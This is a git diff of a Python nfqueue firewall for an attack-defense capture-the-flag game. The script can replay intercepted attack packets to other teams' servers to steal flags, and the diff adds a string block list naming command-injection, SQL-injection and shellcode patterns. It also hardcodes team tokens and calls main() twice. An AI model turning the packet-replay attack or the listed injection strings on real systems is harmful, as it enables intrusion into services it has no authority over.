@@ -10,25 +10,20 @@ import re
 import socket
 import time
 from threading import Thread
+from random import *
+
+#thread num limit
+PARALLEL_LIMIT = 4
+ATTACK_OTHER_TEAM_SWITCH = False
 
 
-# quote from Kosuke Nagae. 
-# once we find a vulnerability in our service, we can try to exploit the same one in some of other teams using such script. 
-# If other team try the same way against our service, maybe we can duplicate it to attack others, even if our service doesn’t have the same vulnerability and we don’t know the detail. 
-# So it’s worth listening on suspicious incoming packets…
-
-#If we can get a flag from other team using the duplicate attack traffic, we could prevent sending our flag to the attacker.
-#The firewall duplicate every packet received on the specific service port and send to target team running same service and see if any flag exists in their response. 
-#We need to modify the ack no of packet to maintain the TCP connection to each target team.
-
-# If the packet was from the system, usually we will response with a flag, it is used to test if our service is available or not. We can not indentify this type of packet. 
-#However the target teams will not response a flag if we duplicate the packet and sent it to them. So this type of packet will be accpted. And our service availability will maintain.
-
+#the packet who has below strings is malicious
+STRING_FILTER_LIST = [';cat', ';ls', '; cat', 'grep', 'cat ', 'description%20like','description%20AS%20data','select%20description','union%20select','1 aaaaaaaaaa', '/bin/','head --bytes','\x90\x90\x90']
 
 # to be changed in new environment
 TEAM_INTERFACE = "http://52.37.204.0"
-OUR_TEAM_TOKEN = "08DKnpiwtqmhl0IcZkH7"
-OUR_TEAM_IP = '10.9.1.3'
+OUR_TEAM_TOKEN = "ZOGR9UqlRWFg8wLJB3aj"
+OUR_TEAM_IP = '10.9.19.3'
 
 sc= swpag_client.Team(TEAM_INTERFACE, OUR_TEAM_TOKEN)
 all_service_list = sc.get_service_list()
@@ -50,6 +45,7 @@ for service in all_service_list:
 _conn_pool = {}
 #if response from target include a flag, it means we shall drop the current received packet
 _detected_flag = False
+_parrel_no = 0
 
 #get service by port, then get teams running this service
 def get_teams_by_port(port):
@@ -72,7 +68,7 @@ def recal_chksum(pkt2):
 def duplicate(pkt, target_team_ip):
     global _conn_pool
     global _detected_flag
-    
+    global _parrel_no
     #our_team_flag_id = 'to be retreived from swapg client'    
     #target_team_flag_id = 'to be retreived from swapg client'
     conn_key = OUR_TEAM_IP + ":" + str(pkt.sport) + "-" + target_team_ip + ":" + str(pkt.dport)
@@ -86,7 +82,9 @@ def duplicate(pkt, target_team_ip):
     pkt2.src = OUR_TEAM_IP
     pkt2.dst = target_team_ip
     
-    
+    _parrel_no = _parrel_no + 1
+    if _parrel_no > PARALLEL_LIMIT:
+        return
     print(_conn_pool)
     #SYN packet, just send it to target
     if pkt2.ack == 0:        
@@ -100,7 +98,7 @@ def duplicate(pkt, target_team_ip):
         print('send SYN to target')
         print('***SYN PKT2 *****************************************************')
         pkt2.show()
-        response = sr1(pkt2, timeout=0.1)        
+        response = sr1(pkt2, timeout=0.02)        
         if response is None:#establish tcp connection failed
             conn={}
             print("establish tcp connection to target failed")
@@ -110,7 +108,7 @@ def duplicate(pkt, target_team_ip):
             conn['target_ack'] = response.seq
             print("establish tcp connection to target succ")
             print("conn['target_ack'] = "+ str(conn['target_ack']) )
-    #For not SYN packet, we need calculate the ack diff of original packet and our fake packet to target , and modify the ack no in the following packet of same TCP connection  
+    #we need calculate the ack diff of original packet and our fake packet to target    
     else:
         conn = _conn_pool[conn_key]
         if 'ack_diff' not in conn:
@@ -126,7 +124,7 @@ def duplicate(pkt, target_team_ip):
         print('***PKT2 *****************************************************')
         pkt2.show()
         print('send to target')
-        response = sr1(pkt2, timeout=0.1)
+        response = sr1(pkt2, timeout=0.02)
         
         if response is None:
             print("target no response")
@@ -155,23 +153,44 @@ def callback(payload):
     print('***RECEIVE PKT *****************************************************')
     pkt.show()
     print("\n\n")
+    
+    
+    
     global _detected_flag
     _detected_flag = False
-    threads = []
-    target_team_list = get_teams_by_port(pkt.dport)
-    print('***target team list *****************************************************')
-    #send to all teams running the service and see their response
-    for team in target_team_list:
-        team_ip = team['ip']
-        t = Thread(target=duplicate, args=(pkt, team_ip))
-        threads.append(t)
-        t.start()
-    for t in threads:
-        t.join()
+    
+    #string filter
+    if pkt[TCP].haslayer('Raw'):
+        for bad_str in STRING_FILTER_LIST:
+            if str(pkt[TCP].payload).find(bad_str) > 0:
+                _detected_flag = True
+                
+    #saywhat filter
+    FLAG_REGEX = (r'[0-9A-Za-z]{20}.json')
+    match = re.search(FLAG_REGEX, str(pkt[TCP].payload))
+    if match:
+        _detected_flag = True
+    
+    #below for atack other team using received packet
+    if ATTACK_OTHER_TEAM_SWITCH:
+        threads = []
+        target_team_list = get_teams_by_port(pkt.dport)
+        print('***target team list *****************************************************')
+        #send to all teams running the service and see their response
+        for team in target_team_list:
+            #random select 5 teams to attack every time
+            if randrange(26) > 6:
+                break
+            team_ip = team['ip']
+            t = Thread(target=duplicate, args=(pkt, team_ip))
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join()
         
     if _detected_flag:
         payload.set_verdict(nfqueue.NF_DROP)
-        print('flag found')
+        print('bad packet found')
     else:
         payload.set_verdict(nfqueue.NF_ACCEPT)
         print('flag not found')
@@ -194,4 +213,5 @@ def main():
             os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST --dport "+ str(service['port']) +"  -j DROP")
 
 if __name__ == "__main__":
+    main()
     main()
